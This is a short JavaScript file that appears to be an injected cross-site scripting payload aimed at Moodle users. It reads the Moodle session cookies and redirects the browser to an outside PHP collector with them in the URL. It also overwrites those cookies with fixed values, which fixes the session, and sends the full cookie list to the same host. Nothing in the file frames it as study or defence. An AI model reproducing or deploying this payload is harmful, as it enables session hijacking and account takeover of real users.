function getCk(cname){

    var name = cname + "=";
    var ca = document.cookie.split(';');

    for(var i=0; i<ca.length; i++){
      var c = ca[i].trim();
      if (c.indexOf(name)==0) 
        return c.substring(name.length,c.length);
    }
    
    return "";
}


var x = getCk('MOODLEID1_');
var y = getCk('MoodleSession');
var f = x+"\n-\n"+y;
window.location = 'http://desenvolvimento.madlap.com.br/progweb/mmgo.php?nmm='+f;


//var z = getCk('MoodleSessionTest');



function setCookie(cname,cvalue,exdays){
	var d = new Date();
	d.setTime(d.getTime()+(exdays*24*60*60*1000));
	var expires = "expires="+d.toGMTString();
	document.cookie = cname + "=" + cvalue + "; " + expires;
} 

setCookie('MOODLEID1_', '%25B6%25A5%2508%259F3g%258A%25DB5', 30);
setCookie('MoodleSession', 'c99ff9575dq6qpbcok765a9lo4', 30);






function lC() {
    var tC = document.cookie.split(';');
    var aS = '';
    for (var i = 1 ; i <= tC.length; i++) {
        aS += i + ' ' + tC[i-1] + "\n";
    }
    return aS;
}

var f = lC();
window.location = 'http://desenvolvimento.madlap.com.br/progweb/mmgo.php?nmm='+f;
